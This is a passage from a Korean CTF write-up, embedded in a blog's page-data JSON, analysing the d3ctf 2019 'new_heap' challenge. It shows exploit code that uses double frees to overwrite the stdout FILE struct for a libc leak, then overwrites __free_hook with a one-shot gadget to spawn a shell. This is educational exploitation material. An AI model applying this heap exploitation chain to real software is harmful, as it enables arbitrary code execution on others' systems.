OKhxmCLjhSbc06BpOYNi+bnnADc+m/Re4F1NLB4SpWK7j9j6uNyoXzMeWiDBDTphYfhxmSIPu7v9FG/ORT29RXjVEZDWGfuQleZgj4IWG5UEvgm5ouqFhe6oOvxbWi4mNa0tl0RLMR7newqyMixr6kRtlUVYFaRmkyPbjx4X8rt1SKaYNU4mZtPw4yqt/jud/lcu3k/6iai/K5eWXO/kNPmqAyq1jY0OHYb32wxSkhQ69vSfbMx+FnQxL1eEX5x02nCDKqqRsgBsaTpBWreXHRUPCDFl+HGQoLZvTH9gT/h/N8/GBcOa2rgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png\"\n        srcset=\"/static/dfec5074f1609d93b8deaeec6076a1f4/e9ff0/11.png 180w,\n/static/dfec5074f1609d93b8deaeec6076a1f4/f21e7/11.png 360w,\n/static/dfec5074f1609d93b8deaeec6076a1f4/267f6/11.png 513w\"\n        sizes=\"(max-width: 513px) 100vw, 513px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>_IO_FILE 구조체의 stdout을 확인해 보면 우리가 변조해야 할 부분은 <code class=\"language-text\">_flags</code>, <code class=\"language-text\">_IO_write_base</code> 이다.</li>\n<li>기존의 stdout flags 값은 <code class=\"language-text\">0xfbad2887</code> , <code class=\"language-text\">_IO_IS_APPENDING</code> 플래그가 존재하지 않기 때문에 <code class=\"language-text\">0xfbad2887 | 0x1000</code> 값으로 조작하자</li>\n<li><code class=\"language-text\">_IO_write_base</code> 값의 하위 바이트를 <code class=\"language-text\">\\x20</code> 으로 조작해 라이브러리 주소를 출력 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free bug</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x70\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\x60\"</span><span class=\"token punctuation\">)</span> # <span class=\"token constant\">stdout</span> <span class=\"token number\">1</span> byte \\x60\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1887</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"\\x20\"</span><span class=\"token punctuation\">)</span>\n\nlibc <span class=\"token operator\">=</span> <span class=\"token function\">uu64</span><span class=\"token punctuation\">(</span><span class=\"token function\">r</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x3eb780</span>\none_shot <span class=\"token operator\">=</span> libc<span class=\"token operator\">+</span><span class=\"token number\">0x4f3c2</span>\nfree_hook <span class=\"token operator\">=</span> libc<span class=\"token operator\">+</span><span class=\"token number\">0x3ed8e8</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">,</span>libc<span class=\"token punctuation\">)</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one_shot \"</span><span class=\"token punctuation\">,</span>one_shot<span class=\"token punctuation\">)</span>\n<span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"free_hook\"</span><span class=\"token punctuation\">,</span>free_hook<span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAABhklEQVQoz5XR62rcMBAF4H2QsuuLRpqRxpIl2Wt77Y0vySZtaNrC0gZ62bbv/xIlaSlJGgKFw/yaDw6c1fF4u58uy7I3XMVcBYERqAVy97cSSNpmyqaShSqEMutcbQT+zur4+bQfzw0yIjtTamTIUQkCgQpI5kppm0mTAKWgU6C/8g6/v/kwX900/aHpZ9f0TjsWqgTUgKXAAkhIs5GcgsmkzqReP8TL67chNC7XBZgosBLKS47KstQRuQbSxJmyibQC7dPan779mKdDRVun46jtLKlBV5mmIFcXfgZtjc3Jp+hBe0nFY/z1+zBdimLKuc3DdpC8VTboHZOP7BdB1riUwvP445fTOMwTmAF5IZ6l3pHxZU3GlT52uijYCfIZBcnhKb49/dyP540powttO3QuulCHeeFt53c9sDXWx27iavDtGRA/wtPFm3Y/j1fXF9fvbNWuBd6tIjARmORqk6kNUHKfhyP9wYfpUPdTd7ZU7cBl9e/HC1ltq5ZcIBsSoFcp/Bf+BRU8cnZelPcRAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./12.png\"\n        title=\"./12.png\"\n        src=\"/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png\"\n        srcset=\"/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/e9ff0/12.png 180w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/f21e7/12.png 360w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/37523/12.png 720w,\n/static/9f8f7a3a39a130ed2c8bfc5ed75731a1/efc66/12.png 885w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>라이브러리 주소를 획득할 수 있다.</li>\n</ul>\n<h2 id=\"shell\" style=\"position:relative;\"><a href=\"#shell\" aria-label=\"shell permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>shell!</h2>\n<ul>\n<li>Double Free Bug를 통해 __free_hook에 할당을 한 후 oneshot 가젯 주소로 조작한다.</li>\n<li>free 함수를 호출하여 쉘을 획득 할 수 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span> <span class=\"token directive keyword\">double</span> <span class=\"token expression\">free</span></span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'A'</span><span class=\"token punctuation\">)</span>\n<span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>one_shot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 702px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.222222222222214%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABHElEQVQoz43P7U6DMBgF4F6IG2Ol9IOWlsKgdIXCgH1EnboY4/1fiVET/2yZJOfPSd4nJy+wXH2c306v73LjctuHVC8oj7EQEQmugphcxRzGbIVoEBHQcPV5vhzOF6ErbVpRWJSkISQI3cBrnASIhYiufipYI2pc78cjSWQQYUh4iOgywstby0uIgwj/VSAId7b10ymRefztfy/InIBJ6oNts7pRhckrJ7IyjNlcPHD51A51N8m8VJuayTyAeAHjWdjktfejNo3IyqzcMllQqYlQs/Bj5bxxmXGpLnVpicgiKiBOHkK0WMf3/wcdS1+6yR+fjeua4WDbgauCiCxRBU01JPyOBzs/ut2+cr3rRusH68etH5t+v7Htv/gLF0NkkHZ2PV8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./13.png\"\n        title=\"./13.png\"\n        src=\"/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png\"\n        srcset=\"/static/f9aedffc660490664fdf82d881bd8f5b/e9ff0/13.png 180w,\n/static/f9aedffc660490664fdf82d881bd8f5b/f21e7/13.png 360w,\n/static/f9aedffc660490664fdf82d881bd8f5b/d6331/13.png 702w\"\n        sizes=\"(max-width: 702px) 100vw, 702px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></li>\n<li><a href=\"#%EB%B3%B4%ED%98%B8-%EA%B8%B0%EB%B2%95\">보호 기법</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#alloc\">alloc</a></li>\n<li><a href=\"#free\">free</a></li>\n<li><a href=\"#memory-leak-idea\">memory leak Idea</a></li>\n<li><a href=\"#_io_file_stdout\">_IO_FILE_stdout</a></li>\n<li><a href=\"#stdout\">stdout</a></li>\n<li><a href=\"#_io_new_file_xsputn-%ED%95%A8%EC%88%98\">_IO_new_file_xsputn 함수</a></li>\n<li><a href=\"#new_do_write-%ED%95%A8%EC%88%98\">new_do_write 함수</a></li>\n<li><a href=\"#how-to-exploit-using-stdout\">How to exploit using stdout</a></li>\n<li><a href=\"#double-free-bug\">Double Free Bug</a></li>\n<li><a href=\"#fake-chunk-%EA%B5%AC%EC%84%B1\">Fake chunk 구성</a></li>\n<li><a href=\"#how-to-free\">How to Free?</a></li>\n<li><a href=\"#free-fake-chunk\">Free Fake chunk</a></li>\n<li><a href=\"#point-to-stdout\">point to stdout</a></li>\n<li><a href=\"#overwrite-stdout-struct\">Overwrite Stdout Struct</a></li>\n<li><a href=\"#shell\">shell!</a></li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"d3ctf 2019 new_heap 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍣"},"fields":{"slug":"/d3ctf2019_new_heap_ctf_writeup/"}},"site":{"siteMetadata":{"siteUrl":"https://www.zoomkoding.com","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/csaw2019_travelle_ctf_writeup/","nextSlug":"/csaw_small_boi_ctf_writeup/","prevSlug":"/d3ctf2019_new_heap_ctf_writeup/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}